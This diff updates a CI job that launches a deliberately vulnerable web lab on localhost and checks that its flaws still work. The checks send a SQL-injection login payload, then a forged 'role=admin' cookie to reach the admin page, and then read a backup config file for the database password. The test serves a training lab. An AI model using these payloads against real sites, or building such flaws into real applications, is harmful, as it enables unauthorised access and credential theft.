@@ -59,7 +59,20 @@ jobs:
         run: |
           LAB_QUIET=1 PORT=8080 python3 labs/web/lab.py &
           for i in $(seq 1 20); do curl -sf http://127.0.0.1:8080/ >/dev/null && break; sleep 0.5; done
+
+          echo "the admin panel refuses unauthenticated requests"
           test "$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/admin/)" = "403"
-          curl -s -L -X POST -d "username=admin'%20OR%201=1--%20-&password=x" \
-            http://127.0.0.1:8080/login.php | grep -q 'flag{'
+
+          # The login form is injectable and answers with an admin cookie. (Do not
+          # follow the redirect here: curl would not carry the Set-Cookie along,
+          # which is what made an earlier version of this check fail.)
+          echo "the login form is SQL-injectable and hands out role=admin"
+          curl -s -D - -o /dev/null -X POST \
+            -d "username=admin'%20OR%201=1--%20-&password=x" \
+            http://127.0.0.1:8080/login.php | grep -qi 'set-cookie: role=admin'
+
+          echo "that cookie exposes the flag"
+          curl -s -H 'Cookie: role=admin' http://127.0.0.1:8080/admin/ | grep -q 'flag{'
+
+          echo "the exposed backup leaks the database password"
           curl -s http://127.0.0.1:8080/backup/config.php.bak | grep -q DB_PASS
